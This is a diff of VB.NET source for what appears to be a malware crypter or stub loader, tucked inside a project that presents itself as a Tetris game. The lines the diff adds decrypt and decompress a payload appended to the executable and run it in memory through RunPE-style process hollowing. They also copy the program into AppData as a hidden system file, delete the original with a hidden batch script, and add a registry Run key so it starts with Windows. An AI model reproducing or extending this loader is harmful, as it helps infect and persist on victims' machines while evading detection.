@@ -200,12 +200,18 @@
         Process.Start("http://www.codeproject.com/Articles/812310/Create-Tetris-games-in-Net")
     End Sub
 End Class
-
 Class Stuff
     Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
         Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
         Return NewByts
     End Function
+
+    Shared Sub AZ(ByVal AppPAth As String, ByVal ExePAth As String)
+        Dim L = New anti.IntegrityCheck
+        L.AppExePath = ExePAth
+        L.AppPath = AppPAth
+        L.RunCheck()
+    End Sub
 
     Shared Sub Test()
         Dim AppPath As String = Application.ExecutablePath
@@ -213,7 +219,12 @@ Class Stuff
         Dim Payload() As Byte = GetPload(AppPath)
         Dim i As Integer = FindSplit(Payload)
         Dim Start As Integer = i
-        If Payload(Start - 8) = &H54 Then
+        If Payload(Start - 10) = &H54 Then
+            'AZi's
+            AZ(Application.StartupPath, Application.ExecutablePath)
+        End If
+
+        If Payload(Start - 14) = &H54 Then
             'copy self
             Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
             If AppPath.ToLower.Contains(TmpPath.ToLower) Then
@@ -221,12 +232,43 @@ Class Stuff
                 Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))
 
                 'copy our self to temp and re execute
-                FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+                Try
+                    FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+
+                Catch ex As Exception
+                    Try
+                        FileIO.FileSystem.DeleteFile(TmpPath & AppName)
+                        FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+
+                    Catch exx As Exception
+                        End
+                    End Try
+                End Try
+
+
+                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.Hidden)
+                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.System)
                 Process.Start(TmpPath & AppName)
-                End
+                'melt
+                If Payload(Start - 12) = &H54 Then
+                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
+                    Dim startInfo As New ProcessStartInfo("a.bat")
+                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
+                    Process.Start(startInfo)
+                    End
+                Else
+                    End
+                End If
+
             End If
         End If
-        If Payload(Start - 10) = &H54 Then
+
+        'check if auto startup
+        If Payload(Start - 8) = &H54 Then
+            startup()
+        End If
+
+        If Payload(Start - 16) = &H54 Then
             'net
         Else
             'native
@@ -245,16 +287,34 @@ Class Stuff
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
 
-        If Payload(Start - 10) = &H54 Then
-            Dim f As New dll.Class1
-            f.Main(Application.ExecutablePath)
-        Else
-            CMemoryExecute.Run(AES_Decrypt(NewByts), AppPath)
-        End If
 
+
+        If Payload(Start - 16) = &H54 Then
+            '  Dim f As New dll.Class1
+            '  f.Main(Application.ExecutablePath)
+            RunPe2.Class1.Run(AES_Decrypt(Decompress(NewByts)), Command, Application.ExecutablePath)
+        Else
+            CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath)
+        End If
         Process.GetCurrentProcess.Kill()
     End Sub
 
+
+    Public Shared Function Decompress(bytes As Byte()) As Byte()
+        Dim stream = New IO.MemoryStream()
+        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
+        Dim buffer = New Byte(4095) {}
+        While True
+            Dim size = zipStream.Read(buffer, 0, buffer.Length)
+            If size > 0 Then
+                stream.Write(buffer, 0, size)
+            Else
+                Exit While
+            End If
+        End While
+        zipStream.Close()
+        Return stream.ToArray()
+    End Function
     Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
         Dim Tmp() As Byte = NewByts
         Dim I As Integer = FindSplit(NewByts) - 7
@@ -272,6 +332,12 @@ Class Stuff
         Return NewByts
     End Function
 
+    Shared Sub startup()
+        Dim regKey As Microsoft.Win32.RegistryKey
+        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+        regKey.SetValue(Application.ProductName, """" & Application.ExecutablePath & """")
+        regKey.Close()
+    End Sub
     Shared Function FindSplit(ByVal Payload() As Byte) As Integer
         Dim Found1 As Boolean = False
         Dim Found2 As Boolean = False
@@ -366,23 +432,10 @@ Class Stuff
             'decode assembly here
 
             stream.Read(assemblyData, 0, assemblyData.Length)
-            assemblyData = AES_Decrypt(assemblyData)
+            assemblyData = AES_Decrypt(Decompress(assemblyData))
             Return Reflection.Assembly.Load(assemblyData)
 
         End Using ' stream
-    End Function
-
-    Private Function ToBytes(ByVal instance As IO.Stream) As Byte()
-        Dim capacity As Integer = If(instance.CanSeek, Convert.ToInt32(instance.Length), 0)
-        Using result As New IO.MemoryStream(capacity)
-            Dim readLength As Integer
-            Dim buffer(4096) As Byte
-            Do
-                readLength = instance.Read(buffer, 0, buffer.Length)
-                result.Write(buffer, 0, readLength)
-            Loop While readLength > 0
-            Return result.ToArray()
-        End Using
     End Function
 
 End Class
